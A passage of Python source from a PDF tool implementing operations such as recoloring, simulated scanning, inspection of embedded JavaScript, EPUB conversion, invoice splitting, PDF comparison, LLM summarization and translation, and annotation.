                        pix.invert_irect(pix.irect)
                        np = out.new_page(width=page.rect.width, height=page.rect.height)
                        np.insert_image(np.rect, pixmap=pix)
                    else:  # dark — invert, then paste original image regions back on top
                        from PIL import Image, ImageOps
                        # eff (not dpi): if the page was downscaled, the image-rect boxes must
                        # be scaled to the ACTUAL pixmap or the "keep images intact" paste lands
                        # in the wrong place / out of bounds.
                        scale = eff / 72.0
                        orig = Image.frombytes("RGB" if pix.n >= 3 else "L", (pix.width, pix.height), pix.samples).convert("RGB")
                        dark = ImageOps.invert(orig)
                        for img in (page.get_images(full=True) or []):
                            try:
                                for r in page.get_image_rects(img[0]):
                                    box = (max(0, int(r.x0 * scale)), max(0, int(r.y0 * scale)),
                                           min(orig.width, int(r.x1 * scale)), min(orig.height, int(r.y1 * scale)))
                                    if box[2] > box[0] and box[3] > box[1]:
                                        dark.paste(orig.crop(box), box[:2])
                                        protected += 1
                            except Exception:  # noqa: BLE001
                                pass
                        import io as _io
                        buf = _io.BytesIO()
                        dark.save(buf, format="PNG")
                        np = out.new_page(width=page.rect.width, height=page.rect.height)
                        np.insert_image(np.rect, stream=buf.getvalue())
                out.save(out_pdf, garbage=3, deflate=True)
                out.close()
                label = "grayscale" if mode in ("grayscale", "gray") else mode
                note = "recolored %d page(s) (%s)" % (doc.page_count, label)
                if mode == "dark" and protected:
                    note += " · %d image(s) kept intact" % protected
                note += _downscale_note(_ds, dpi)
                result["changed"] = True
                result["note"] = note

        elif op == "scanner_effect":
            # Make a clean PDF look scanned: rasterize, then skew slightly, soften, and add
            # grain. Needs Pillow. Deterministic per page (skew alternates by page index).
            try:
                import io
                from PIL import Image, ImageFilter, ImageEnhance
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "scanner_effect needs Pillow: %s (pip install pillow)" % e}
            else:
                dpi = _clamp_dpi(params.get("dpi"))
                skew = float(params.get("skew", 0.7))          # max degrees of rotation
                noise = max(0.0, min(1.0, float(params.get("noise", 0.06))))
                gray = bool(params.get("grayscale", True))
                out = fitz.open()
                _ds = []
                for pno in range(doc.page_count):
                    page = doc.load_page(pno)
                    pix, eff, down = _safe_pixmap(page, dpi)   # P0-1: never crash on an oversized page
                    if down:
                        _ds.append((pno + 1, eff))
                    im = Image.frombytes("RGB" if pix.n >= 3 else "L", (pix.width, pix.height), pix.samples).convert("RGB")
                    if gray:
                        im = im.convert("L").convert("RGB")
                    angle = skew * (1 if pno % 2 == 0 else -1)
                    im = im.rotate(angle, expand=False, fillcolor=(255, 255, 255), resample=Image.BICUBIC)
                    im = ImageEnhance.Contrast(im).enhance(1.08)
                    im = im.filter(ImageFilter.GaussianBlur(0.4))
                    if noise > 0:
                        grain = Image.effect_noise((im.width, im.height), 24).convert("RGB")
                        im = Image.blend(im, grain, noise)
                    buf = io.BytesIO()
                    im.save(buf, format="JPEG", quality=80)
                    np = out.new_page(width=page.rect.width, height=page.rect.height)
                    np.insert_image(np.rect, stream=buf.getvalue())
                out.save(out_pdf, garbage=3, deflate=True)
                out.close()
                result["changed"] = True
                result["note"] = ("applied scanner effect to %d page(s)" % doc.page_count) + _downscale_note(_ds, dpi)

        elif op == "extract_js":
            # Surface embedded JavaScript (document Names tree + OpenAction) for inspection.
            # Read-only: writes a report, doesn't change the PDF. (Use `sanitize` to remove JS.)
            try:
                import pikepdf
            except Exception as e:  # noqa: BLE001
                result = {"ok": False, "error": "extract_js needs pikepdf: %s (pip install pikepdf)" % e}
            else:
                to = params.get("to") or "output/javascript.md"
                doc.close()
                pdf = pikepdf.open(in_pdf)

                def _js_code(action):
                    try:
                        if str(action.get("/S")) != "/JavaScript":
                            return None
                        j = action.get("/JS")
                        if j is None:
                            return None
                        try:  # /JS may be a stream (large scripts) …
                            return bytes(j.read_bytes()).decode("latin-1", "replace")
                        except Exception:  # noqa: BLE001 — … or a plain text string
                            return str(j)
                    except Exception:  # noqa: BLE001
                        return None

                found = []
                try:
                    root_names = pdf.Root.get("/Names")
                    if root_names is not None and "/JavaScript" in root_names:
                        for name, obj in pikepdf.NameTree(root_names.JavaScript).items():
                            code = _js_code(obj)
                            if code:
                                found.append((str(name), code))
                except Exception:  # noqa: BLE001
                    pass
                try:
                    oa = pdf.Root.get("/OpenAction")
                    if oa is not None:
                        code = _js_code(oa)
                        if code:
                            found.append(("OpenAction (runs on open)", code))
                except Exception:  # noqa: BLE001
                    pass
                pdf.close()
                lines = ["# Embedded JavaScript — %d block(s)" % len(found), ""]
                if not found:
                    lines.append("_No document-level JavaScript found._")
                for name, code in found:
                    lines += ["## %s" % name, "", "```javascript", code.strip(), "```", ""]
                with open(os.path.join(art_dir, "javascript.md"), "w", encoding="utf-8") as f:
                    f.write("\n".join(lines))
                result["artifacts"].append({"tmp": "javascript.md", "path": to, "kind": "text"})
                result["note"] = "found %d JavaScript block(s)%s" % (len(found), " — review before opening this PDF" if found else "")

        elif op == "flip_pages":
            import pikepdf
            direction = str(params.get("direction") or "horizontal").lower()
            if direction not in ("horizontal", "vertical"):
                result = {"ok": False, "error": "flip_pages direction must be \"horizontal\" or \"vertical\""}
            else:
                want = _page_set(params.get("pages"), doc.page_count)
                doc.close()
                pdf = pikepdf.open(in_pdf)
                n = 0
                for i, page in enumerate(pdf.pages):
                    if want and (i + 1) not in want:
                        continue
                    box = [float(x) for x in page.mediabox]
                    w, h = box[2] - box[0], box[3] - box[1]
                    # Mirror the page's content with a transform matrix, then re-anchor it.
                    m = (b"-1 0 0 1 %f 0 cm" % w) if direction == "horizontal" else (b"1 0 0 -1 0 %f cm" % h)
                    page.contents_coalesce()
                    page.contents_add(pikepdf.Stream(pdf, b"q " + m + b"\n"), prepend=True)
                    page.contents_add(pikepdf.Stream(pdf, b"\nQ"))
                    n += 1
                pdf.save(out_pdf)
                pdf.close()
                result["changed"] = True
                result["note"] = "flipped %d page(s) %s" % (n, direction)

        elif op == "pdf_to_epub":
            import shutil
            to = params.get("to") or "output/book.epub"
            md = doc.metadata or {}
            title = params.get("title") or md.get("title") or os.path.splitext(os.path.basename(in_pdf))[0]
            author = params.get("author") or md.get("author") or ""
            engine = str(params.get("engine") or "auto").lower()
            epub_tmp = os.path.join(art_dir, "book.epub")
            used = None
            # Calibre's ebook-convert gives the best reflow (heuristic chapter/format
            # detection) when it's installed; otherwise fall back to a self-contained
            # PyMuPDF text-to-EPUB builder (always available with the bundled backend).
            if engine in ("auto", "calibre"):
                exe = shutil.which("ebook-convert")
                if exe:
                    try:
                        cmd = [exe, in_pdf, epub_tmp, "--enable-heuristics"]
                        if title:
                            cmd += ["--title", str(title)]
                        if author:
                            cmd += ["--authors", str(author)]
                        subprocess.run(cmd, check=True, capture_output=True, timeout=1200)
                        used = "calibre"
                    except Exception:
                        used = None
            if used is None and engine == "calibre":
                result = {"ok": False, "error": "Calibre 'ebook-convert' not found or failed — install Calibre, or use engine: pymupdf"}
            elif used is None:
                nch = _build_epub_pymupdf(doc, epub_tmp, title, author, int(params.get("chapter_pages") or 10))
                used = "pymupdf (%d chapters)" % nch
            if used is not None and (not isinstance(result, dict) or result.get("ok", True)):
                result["artifacts"].append({"tmp": "book.epub", "path": to, "kind": "epub"})
                result["note"] = "converted to EPUB via %s → %s" % (used, to)

        elif op == "split_invoices":
            to = (params.get("to") or "output/invoices").rstrip("/")

            # OCR-first pass for scans (same approach as extract_markdown): rebuild
            # a text layer before reading, so detection has text to work with.
            src_pdf = in_pdf
            if params.get("ocr_first"):
                try:
                    import ocrmypdf
                    _ocr = os.path.join(art_dir, "_ocr_source.pdf")
                    ocrmypdf.ocr(in_pdf, _ocr, force_ocr=True, progress_bar=False,
                                 output_type="pdf", language=str(params.get("lang") or "eng"))
                    src_pdf = _ocr
                except Exception:
                    pass  # OCRmyPDF/Tesseract missing or failed — use the original
            sdoc = fitz.open(src_pdf) if src_pdf != in_pdf else doc
            n = sdoc.page_count
            if n == 0:
                raise RuntimeError("the PDF has no pages")

            heads, fulls, blank = [], [], []
            for pno in range(n):
                t = sdoc.load_page(pno).get_text() or ""
                fulls.append(t)
                heads.append(_page_head(t))
                blank.append(len(t.strip()) < 3)

            detect = str(params.get("detect") or "heuristic").lower()
            starts_param = params.get("starts")
            manual = isinstance(starts_param, list) and len(starts_param) > 0
            ai_note = None

            def _heuristic_starts():
                kw = params.get("keywords")
                if not isinstance(kw, list) or not kw:
                    kw = ["invoice", "tax invoice", "receipt", "statement", "bill to"]
                return _invoice_boundaries(heads, fulls, kw)

            if manual:
                starts = sorted({max(0, min(n - 1, int(s) - 1)) for s in starts_param
                                 if isinstance(s, (int, float))})
                if not starts or starts[0] != 0:
                    starts = [0] + [s for s in starts if s != 0]
            elif detect == "ai":
                # LLM boundary detection; fall back to the heuristic on any failure
                # so a model hiccup can't fail the whole render.
                try:
                    starts = _ai_invoice_starts(heads, params.get("model"))
                except Exception as e:  # noqa: BLE001
                    starts = _heuristic_starts()
                    ai_note = "AI detection failed (%s) — used the heuristic detector" % str(e)[:120]
            else:
                starts = _heuristic_starts()

            # Group pages [start .. next_start-1]; optionally trim trailing blanks.
            groups = []
            for gi, s in enumerate(starts):
                e = (starts[gi + 1] - 1) if gi + 1 < len(starts) else (n - 1)
                if params.get("drop_blank"):
                    while e > s and blank[e]:
                        e -= 1
                groups.append((s, e))

            name_tpl = str(params.get("name") or "invoice_{index:04d}")
            used = {}
            manifest = ["index,page_start,page_end,invoice_number,vendor,date,filename"]
            for gi, (s, e) in enumerate(groups):
                idx = gi + 1
                num, vendor, date = _invoice_meta(heads[s])
                stem = _safe_filename(_render_name(name_tpl, idx, num, vendor, date, s + 1, e + 1),
                                      "invoice_%04d" % idx)
                key = stem.lower()
                if key in used:
                    stem = "%s_%04d" % (stem, idx)  # de-dup collisions
                used[key] = True
                fn = "%s.pdf" % stem
                out = fitz.open()
                out.insert_pdf(sdoc, from_page=s, to_page=e)
                out.save(os.path.join(art_dir, fn), garbage=3, deflate=True)
                out.close()
                result["artifacts"].append({"tmp": fn, "path": "%s/%s" % (to, fn), "kind": "pdf"})
                manifest.append(",".join(_csv_field(x) for x in
                                         [idx, s + 1, e + 1, num, vendor, date, fn]))

            with open(os.path.join(art_dir, "_manifest.csv"), "w", encoding="utf-8") as f:
                f.write("\n".join(manifest) + "\n")
            result["artifacts"].append({"tmp": "_manifest.csv", "path": "%s/_manifest.csv" % to, "kind": "text"})

            if sdoc is not doc:
                sdoc.close()

            if len(groups) == 1 and n > 1 and not manual:
                result["note"] = ("detected 1 invoice — no boundaries found. If this PDF holds "
                                  "several invoices, try ocr_first: true (for scans), detect: ai, "
                                  "or pass explicit starts:")
            else:
                result["note"] = "split into %d invoice file(s) in %s/" % (len(groups), to)
            if ai_note:
                result["note"] = "%s [%s]" % (result["note"], ai_note)

        elif op == "compare_pdfs":
            import difflib
            import json as _cmpjson
            against_rel = _safe_rel(params.get("against"))
            if not against_rel or not os.path.exists(against_rel):
                raise RuntimeError("`against` PDF not found or outside project: %s" % params.get("against"))
            bdoc = fitz.open(against_rel)
            if getattr(doc, "needs_pass", False) or getattr(bdoc, "needs_pass", False):
                raise RuntimeError("an input is password-protected — decrypt it first")

            to = (params.get("to") or "output/diff").rstrip("/")
            mode = str(params.get("mode") or "both").lower()
            do_text = mode in ("text", "both")
            do_visual = mode in ("visual", "both")
            dpi = _clamp_dpi(params.get("dpi"))
            tol = int(params.get("tolerance") or 0)
            sbs = bool(params.get("side_by_side") or params.get("diff_pdf"))
            sbs_doc = fitz.open() if sbs else None
            oc = params.get("only_changed")
            only_changed = True if oc is None else bool(oc)  # noqa: F841 (documents intent)
            MAX_IMAGES = 200

            base_texts = [doc.load_page(i).get_text() for i in range(doc.page_count)]
            against_texts = [bdoc.load_page(i).get_text() for i in range(bdoc.page_count)]
            aligned = _align_pages([_norm_page_text(t) for t in base_texts],
                                   [_norm_page_text(t) for t in against_texts])

            changes, report = [], []
            n_changed = n_added = n_removed = images = 0
            capped = False
            for kind, bp, ap in aligned:
                if kind == "equal":
                    continue
                k = len(changes) + 1
                entry = {"index": k, "kind": kind,
                         "base_page": (bp + 1) if bp is not None else None,
                         "against_page": (ap + 1) if ap is not None else None, "image": None}
                added_lines = None
                if kind == "replace":
                    n_changed += 1
                    diff = list(difflib.unified_diff((base_texts[bp] or "").splitlines(),
                                (against_texts[ap] or "").splitlines(),
                                fromfile="base p%d" % (bp + 1), tofile="against p%d" % (ap + 1), lineterm=""))
                    added_lines = [ln[1:].strip() for ln in diff
                                   if ln.startswith("+") and not ln.startswith("+++") and ln[1:].strip()]
                    if do_text:
                        body = "\n".join(diff) if diff else "(text identical; rendered content differs)"
                        report.append("### Change %d — page %d → %d (modified)\n\n```diff\n%s\n```\n" % (k, bp + 1, ap + 1, body))
                elif kind == "removed":
                    n_removed += 1
                    if do_text:
                        report.append("### Change %d — page %d removed\n" % (k, bp + 1))
                else:  # added
                    n_added += 1
                    if do_text:
                        report.append("### Change %d — page %d added\n" % (k, ap + 1))

                if do_visual:
                    if images >= MAX_IMAGES:
                        capped = True
                    else:
                        try:
                            img = _compare_image(doc, bdoc, kind, bp, ap, added_lines, dpi, tol)
                            pageno = (ap + 1) if ap is not None else (bp + 1)
                            fn = "change_%02d_p%d.png" % (k, pageno)
                            img.save(os.path.join(art_dir, fn))
                            entry["image"] = "%s/%s" % (to, fn)
                            result["artifacts"].append({"tmp": fn, "path": "%s/%s" % (to, fn), "kind": "image"})
                            images += 1
                        except Exception:
                            pass  # a single page's render failing must not abort the diff
                if sbs and sbs_doc.page_count < MAX_IMAGES:
                    try:
                        _diff_pdf_page(sbs_doc, doc, bdoc, kind, bp, ap, added_lines, dpi,
                                       "Change %d — %s (base p%s -> against p%s)" % (
                                           k, kind,
                                           (bp + 1) if bp is not None else "-",
                                           (ap + 1) if ap is not None else "-"), tol)
                    except Exception:
                        pass  # one bad page must not abort the diff PDF
                changes.append(entry)

            head = ["# PDF comparison", "",
                    "- base: %d page(s) · against: %d page(s)" % (doc.page_count, bdoc.page_count),
                    "- **%d changed · %d added · %d removed**" % (n_changed, n_added, n_removed)]
            if capped:
                head.append("- note: visual images capped at %d (see the text diff for the rest)" % MAX_IMAGES)
            if not changes:
                head += ["", "**No differences found.**"]
            report_md = "\n".join(head + (["", "---", ""] + report if report else []))
            with open(os.path.join(art_dir, "_report.md"), "w", encoding="utf-8") as f:
                f.write(report_md + "\n")
            result["artifacts"].append({"tmp": "_report.md", "path": "%s/_report.md" % to, "kind": "text"})
            with open(os.path.join(art_dir, "_summary.json"), "w", encoding="utf-8") as f:
                _cmpjson.dump({"base_pages": doc.page_count, "against_pages": bdoc.page_count,
                               "changed": n_changed, "added": n_added, "removed": n_removed,
                               "changes": changes}, f, indent=2)
            result["artifacts"].append({"tmp": "_summary.json", "path": "%s/_summary.json" % to, "kind": "json"})
            diff_pdf_note = ""
            if sbs_doc is not None:
                if sbs_doc.page_count:
                    sbs_doc.save(os.path.join(art_dir, "diff.pdf"), deflate=True)
                    result["artifacts"].append({"tmp": "diff.pdf", "path": "%s/diff.pdf" % to, "kind": "pdf"})
                    diff_pdf_note = "; side-by-side diff.pdf (%d page(s))" % sbs_doc.page_count
                sbs_doc.close()
            bdoc.close()
            result["note"] = ("no differences found" if not changes else
                              "%d changed, %d added, %d removed page(s); %d image(s) in %s/%s"
                              % (n_changed, n_added, n_removed, images, to, diff_pdf_note))

        elif op == "summarize":
            to = params.get("to") or "output/summary.md"
            text = _doc_text(doc, int(params.get("max_chars") or 60000))
            if not text.strip():
                raise RuntimeError("no extractable text to summarize (scanned PDF? OCR it first, e.g. the `ocr` op)")
            style = str(params.get("style") or "bullets").lower()
            how = {"bullets": "a bulleted list of the key points",
                   "abstract": "a short prose abstract (one or two paragraphs)",
                   "outline": "a hierarchical outline with headings"}.get(style, "a bulleted list of the key points")
            focus = params.get("focus")
            prompt = "Summarize the following document as %s.%s Be faithful to the source and concise. Output GitHub-flavored Markdown.\n\n---\n\n%s" % (
                how, (" Focus on: %s." % focus) if focus else "", text)
            md = _llm_complete(prompt, model=params.get("model"),
                               system="You are a precise document summarizer. Never invent facts.",
                               max_tokens=int(params.get("max_tokens") or 1024))
            with open(os.path.join(art_dir, "summary.md"), "w", encoding="utf-8") as f:
                f.write((md or "").strip() + "\n")
            result["artifacts"].append({"tmp": "summary.md", "path": to, "kind": "text"})
            result["note"] = "summarized %d chars (style=%s)" % (len(text), style)

        elif op == "translate":
            lang = params.get("lang") or params.get("to_lang")
            if not lang:
                raise RuntimeError("translate requires `lang` (the target language, e.g. \"Spanish\")")
            model = params.get("model")
            max_tokens = int(params.get("max_tokens") or 2048)
            chunk = int(params.get("chunk") or 3500)
            if params.get("layout") or params.get("in_place"):
                # Layout-preserving: translate each text block and write it back into
                # the SAME box (white-out + fitted text) → a translated PDF that keeps
                # the original page geometry, images and tables in place.
                fontname = _lang_font(lang)
                blocks, segs = [], []  # blocks: (pno, Rect, size, seg_index)
                for pno in range(doc.page_count):
                    for blk in doc.load_page(pno).get_text("dict").get("blocks", []):
                        if blk.get("type", 0) != 0:
                            continue  # skip image blocks
                        lines = blk.get("lines", [])
                        txt = " ".join(
                            "".join(sp.get("text", "") for sp in ln.get("spans", [])).strip()
                            for ln in lines).strip()
                        if not txt:
                            continue
                        sizes = [sp.get("size", 11) for ln in lines for sp in ln.get("spans", [])]
                        blocks.append((pno, fitz.Rect(blk["bbox"]), float(min(sizes) if sizes else 11), len(segs)))
                        segs.append(txt)
                if not segs:
                    raise RuntimeError("no extractable text to translate (scanned PDF? OCR it first)")
                translated = _translate_segments(segs, lang, model, max_tokens, chunk)
                clipped = 0
                for (pno, rect, size, idx) in blocks:
                    if not _fit_textbox(doc.load_page(pno), rect, translated[idx] or "", fontname, size):
                        clipped += 1
                doc.save(out_pdf, garbage=3, deflate=True)
                result["changed"] = True
                result["note"] = "translated %d block(s) to %s in place (font=%s)%s" % (
                    len(blocks), lang, fontname, ("; %d block(s) clipped to fit" % clipped) if clipped else "")
            else:
                to = params.get("to") or "output/translated.md"
                text = _doc_text(doc, int(params.get("max_chars") or 100000))
                if not text.strip():
                    raise RuntimeError("no extractable text to translate (scanned PDF? OCR it first)")
                parts = _translate_segments(_chunk_text(text, chunk), lang, model, max_tokens, chunk)
                md = "\n\n".join(p for p in parts if p)
                with open(os.path.join(art_dir, "translated.md"), "w", encoding="utf-8") as f:
                    f.write(md + "\n")
                result["artifacts"].append({"tmp": "translated.md", "path": to, "kind": "text"})
                result["note"] = "translated %d chars to %s (%d chunk(s))" % (len(text), lang, len(parts))

        elif op == "annotate":
            items = params.get("annotations")
            if isinstance(items, dict):
                items = [items]
            if not isinstance(items, list) or not items:
                raise RuntimeError("annotate requires `annotations` (a list of annotation specs)")

            def _r4(it):
                r = it.get("rect")
                return [float(v) for v in r[:4]] if isinstance(r, (list, tuple)) and len(r) >= 4 else None

            # Coordinate origin: bottom-left (default, like crop/stamp) or an opt-in
            # top-left. The closures convert an OPW rect/point to a PyMuPDF (top-left) one.
            top_left = str(params.get("origin") or "").lower().replace("-", "").replace("_", "") in ("topleft", "top")

            def _rc(page, x, y, w, h):
                import fitz
                if top_left:
                    return fitz.Rect(x, y, x + w, y + h)
                hh = page.rect.height
                return fitz.Rect(x, hh - y - h, x + w, hh - y)

            def _pc(page, x, y):
                import fitz
                return fitz.Point(x, y) if top_left else fitz.Point(x, page.rect.height - y)

            applied = skipped = 0
            pages_touched = set()
            for it in items:
                if not isinstance(it, dict):
                    skipped += 1
                    continue
                try:
                    pno = int(it.get("page", 1)) - 1
                    if pno < 0 or pno >= doc.page_count:
                        skipped += 1
                        continue
                    page = doc.load_page(pno)
                    typ = str(it.get("type") or "").lower()
                    color = _parse_color(it.get("color"))
                    fill = _parse_color(it.get("fill"))
                    opac = it.get("opacity")
                    opac = float(opac) if isinstance(opac, (int, float)) else None
                    r4 = _r4(it)
                    done = False

                    if typ == "text" and r4:
                        rect = _rc(page, *r4)
                        try:
                            a = page.add_freetext_annot(rect, str(it.get("text") or ""),
                                                        fontsize=float(it.get("size") or 12),
                                                        text_color=(color or (0, 0, 0)), fill_color=fill)
                            if opac is not None:
                                try:
                                    a.set_opacity(opac)
                                except Exception:
                                    pass
                            a.update()
                        except Exception:
                            a = page.add_freetext_annot(rect, str(it.get("text") or ""))
                            try:
                                a.update()
                            except Exception:
                                pass
                        done = True
                    elif typ == "highlight":
                        find = it.get("find")
                        quads = page.search_for(str(find)) if find else ([_rc(page, *r4)] if r4 else [])
                        if quads:
                            for q in quads:
                                try:
                                    a = page.add_highlight_annot(q)
                                    if color:
                                        a.set_colors(stroke=color)
                                    if opac is not None:
                                        a.set_opacity(opac)
                                    a.update()
                                except Exception:
                                    pass
                            done = True
                    elif typ == "note":
                        at = it.get("at") or it.get("rect")
                        if isinstance(at, (list, tuple)) and len(at) >= 2:
                            a = page.add_text_annot(_pc(page, float(at[0]), float(at[1])),
                                                    str(it.get("text") or ""), icon="Note")
                            if color:
                                try:
                                    a.set_colors(stroke=color)
                                    a.update()
                                except Exception:
                                    pass
                            done = True
                    elif typ in ("rect", "ellipse") and r4:
                        rect = _rc(page, *r4)
                        draw = page.draw_oval if typ == "ellipse" else page.draw_rect
                        kw = {"color": color or (0, 0, 0), "fill": fill, "width": float(it.get("width") or 1)}
                        try:
                            draw(rect, fill_opacity=(opac if opac is not None else 1),
                                 stroke_opacity=(opac if opac is not None else 1), **kw)
                        except Exception:
                            draw(rect, **kw)
                        done = True
                    elif typ == "line":
                        at, to = it.get("at"), it.get("to")
                        if (isinstance(at, (list, tuple)) and len(at) >= 2 and
                                isinstance(to, (list, tuple)) and len(to) >= 2):
                            page.draw_line(_pc(page, float(at[0]), float(at[1])),
                                           _pc(page, float(to[0]), float(to[1])),
                                           color=color or (0, 0, 0), width=float(it.get("width") or 1))
                            done = True
                    elif typ == "image" and r4:
                        rel = _safe_rel(it.get("image"))
                        if rel and os.path.exists(rel):
                            page.insert_image(_rc(page, *r4), filename=rel)
                            done = True

                    if done:
                        applied += 1
                        pages_touched.add(pno + 1)
                    else:
                        skipped += 1
                except Exception:  # noqa: BLE001 — one bad item must not abort the rest
                    skipped += 1

            if applied == 0:
                raise RuntimeError("no valid annotations were applied (check the annotations list)")
            baked = False
            if params.get("flatten"):
                try:
                    doc.bake()  # bake markup annotations into page content (PyMuPDF >= 1.24)
                    baked = True
                except Exception:
                    pass
            doc.save(out_pdf, garbage=3, deflate=True)
            result["changed"] = True
            result["note"] = "added %d annotation(s) across %d page(s)%s%s" % (
                applied, len(pages_touched), (" (%d skipped)" % skipped) if skipped else "",
                " · flattened" if baked else "")

        elif op == "highlight":
            # Find-and-MARK: auto_redact's matcher (literal terms / regexes / PII
            # presets, with the same case + whole-word switches), but each hit gets a
            # real PDF markup annotation instead of being destroyed. The marks round-trip
            # through extract_annotations and are removable via remove_annotations.
            def _as_list(v):
                if isinstance(v, str):
                    v = [v]
                return [str(x) for x in (v or []) if str(x).strip()]
            terms = _as_list(params.get("text"))
            regexes = _as_list(params.get("regex"))
            presets = [p.strip().lower() for p in _as_list(params.get("patterns"))]
            ignore_case = bool(params.get("ignore_case") or params.get("case_insensitive"))
            whole_word = bool(params.get("whole_word"))
            preview = bool(params.get("preview") or params.get("dry_run"))
            style = str(params.get("style") or "highlight").strip().lower()
            specs, unknown = _redact_specs(terms, regexes, presets, whole_word)
            if not specs:
                result = {"ok": False, "error": "highlight requires `text`, `regex`, or `patterns` (one or more)"}
            elif style not in _HL_STYLES:
                result = {"ok": False,
                          "error": "highlight `style` must be one of: %s" % ", ".join(_HL_STYLES)}
            else:
                color = _parse_color(params.get("color"), _HL_COLORS[style])
                opac = params.get("opacity")
                opac = float(opac) if isinstance(opac, (int, float)) else None
                width = params.get("width")
                width = float(width) if isinstance(width, (int, float)) else 1.0
                note = params.get("note")
                author = str(params.get("author") or "PDF Studio")
                want = _page_set(params.get("pages"), doc.page_count)
                adder = {
                    "highlight": "add_highlight_annot",
                    "underline": "add_underline_annot",
                    "strikeout": "add_strikeout_annot",
                    "squiggly": "add_squiggly_annot",
                }.get(style)

                def _mark(page, rects):
                    """Apply the chosen style to one match's word rects. One annotation per
                    match for the quad styles; one per visual line for a box."""
                    made = []
                    if adder:
                        made.append(getattr(page, adder)(rects))
                    else:  # box — a rectangle per line band, nudged out so it can't clip glyphs
                        for band in _line_bands(rects):
                            a = page.add_rect_annot(band + (-1.5, -1.5, 1.5, 1.5))
                            a.set_border(width=width)
                            made.append(a)
                    for a in made:
                        if a is None:
                            continue
                        try:
                            a.set_colors(stroke=color)
                            if opac is not None:
                                a.set_opacity(opac)
                            if note or author:
                                a.set_info(content=str(note or ""), title=author)
                            a.update()
                        except Exception:  # noqa: BLE001 — a viewer-quirky annot must not abort the run
                            pass
                    return len(made)

                n = 0
                hits = {}
                rows = []  # preview: (page, matched, label)
                pages_touched = set()
                for pno in range(doc.page_count):
                    if want is not None and (pno + 1) not in want:
                        continue
                    page = doc.load_page(pno)
                    for label, matched, rects in _page_redactions(page, specs, ignore_case):
                        hits[label] = hits.get(label, 0) + 1
                        n += 1
                        if preview:
                            rows.append((pno + 1, matched, label))
                        elif _mark(page, rects):
                            pages_touched.add(pno + 1)
                missed = [lbl for (lbl, _p) in specs if hits.get(lbl, 0) == 0]

                if preview:
                    lines = ["# Highlight preview", "",
                             "**%d match(es)** across %d page(s). NOTHING was marked — this is a dry run "
                             "(style would be `%s`; matching is %s). Remove `preview: true` to apply." % (
                                 n, doc.page_count, style,
                                 "case-insensitive" if ignore_case else "case-sensitive"), ""]
                    if rows:
                        lines += ["| page | matched text | rule |", "|------|--------------|------|"]
                        for (pg, matched, label) in rows:
                            safe = matched.replace("|", "\\|").replace("\n", " ")
                            lines.append("| %d | %s | %s |" % (pg, safe, label))
                    if missed:
                        lines += ["", "**No match for:** " + ", ".join(missed)]
                    if unknown:
                        lines += ["", "**Unknown pattern preset(s) ignored:** " + ", ".join(unknown)
                                  + "  \n(known presets: " + ", ".join(sorted(_REDACT_PRESETS)) + ")"]
                    to = params.get("to") or "output/highlight-preview.md"
                    with open(os.path.join(art_dir, "highlight-preview.md"), "w", encoding="utf-8") as f:
                        f.write("\n".join(lines) + "\n")
                    result["artifacts"].append({"tmp": "highlight-preview.md", "path": to, "kind": "text"})
                    doc.save(out_pdf, garbage=3, deflate=True)  # unchanged pass-through
                    result["changed"] = False
                    note_txt = "PREVIEW: %d match(es) — NOTHING marked; see %s" % (n, to)
                    if missed:
                        note_txt += "; %d rule(s) with no match" % len(missed)
                    result["note"] = note_txt
                else:
                    baked = False
                    if n and params.get("flatten"):
                        try:
                            doc.bake()  # bake markup into page content (PyMuPDF >= 1.24)
                            baked = True
                        except Exception:
                            pass
                    doc.save(out_pdf, garbage=3, deflate=True)
                    result["changed"] = bool(n)
                    note_txt = "%s %d match(es) across %d page(s)%s" % (
                        style, n, len(pages_touched), " · flattened" if baked else "")
                    if missed:
                        note_txt += "; no match for: " + ", ".join(missed)
                    if unknown:
                        note_txt += "; unknown preset(s) ignored: " + ", ".join(unknown)
                    result["note"] = note_txt

        elif op in ("extract_markdown", "pdf_to_markdown"):
            to = params.get("to") or "output/document.md"
            engine = str(params.get("engine") or "auto").lower()
            margins = params.get("margins")
            _m = float(margins) if isinstance(margins, (int, float)) and margins > 0 else 0.0

            # OCR control (P1-6). `ocr`: off | auto | force; legacy `ocr_first` == force.
            ocr_mode = str(params.get("ocr") or ("force" if params.get("ocr_first") else "auto")).lower()
            if params.get("remote") and params.get("endpoint"):
                result = {"ok": False, "error": 'extract_markdown: set "remote" (SSH) OR "endpoint" (HTTP), not both'}
            elif ocr_mode not in ("off", "auto", "force"):
                result = {"ok": False, "error": 'extract_markdown `ocr` must be "off", "auto", or "force"'}
            else:
                # Coverage drives `auto` (OCR only a doc with no usable text layer) and the
                # markitdown image-only guard. Computed once, lazily (one get_text pass).
                _covc = {}

                def _cov():
                    if "v" not in _covc:
                        _covc["v"] = _text_coverage(doc)["summary"]
                    return _covc["v"]

                # marker does its OWN OCR — never run an ocrmypdf pre-pass for it (redundant, and
                # `force` could DESTROY sparse script-in-graphic text the existing layer holds).
                is_marker = engine == "marker" or bool(params.get("remote")) or bool(params.get("endpoint"))
                if ocr_mode == "off":
                    marker_force_ocr = False
                elif ocr_mode == "force":
                    marker_force_ocr = True
                else:  # auto
                    marker_force_ocr = bool(_cov()["needs_ocr"])

                # Local-engine ocrmypdf pre-pass. `auto` uses skip_text (fill gaps, KEEP existing
                # text — never force_ocr, which on a mixed deck loses sparse text); `force` uses
                # force_ocr. Skipped for marker engines and when a text layer already suffices.
                src_pdf = in_pdf
                # mineru (like marker) is a VLM that reads page images directly — an ocrmypdf
                # pre-pass would be redundant, so skip it and let mineru do its own recognition.
                if not is_marker and engine != "mineru" and ocr_mode != "off" and (ocr_mode == "force" or _cov()["needs_ocr"]):
                    try:
                        import ocrmypdf
                        _ocr = os.path.join(art_dir, "_ocr_source.pdf")
                        _kw = {"force_ocr": True} if ocr_mode == "force" else {"skip_text": True}
                        ocrmypdf.ocr(in_pdf, _ocr, progress_bar=False, output_type="pdf",
                                     language=str(params.get("lang") or "eng"), **_kw)
                        src_pdf = _ocr
                    except Exception:
                        pass  # OCRmyPDF/Tesseract missing or failed — use the original

                def _via_pymupdf4llm():
                    # Best PDF quality: reconstructs headings, lists, and tables.
                    import pymupdf4llm
                    kwargs = {}
                    if _m:
                        kwargs["margins"] = (0, _m, 0, _m)
                    return pymupdf4llm.to_markdown(src_pdf, **kwargs)

                def _via_markitdown():
                    # Microsoft MarkItDown — broad format support (PDF via pdfminer, NO OCR).
                    from markitdown import MarkItDown
                    res = MarkItDown().convert(src_pdf)
                    return getattr(res, "text_content", None) or getattr(res, "markdown", "") or ""

                def _via_marker():
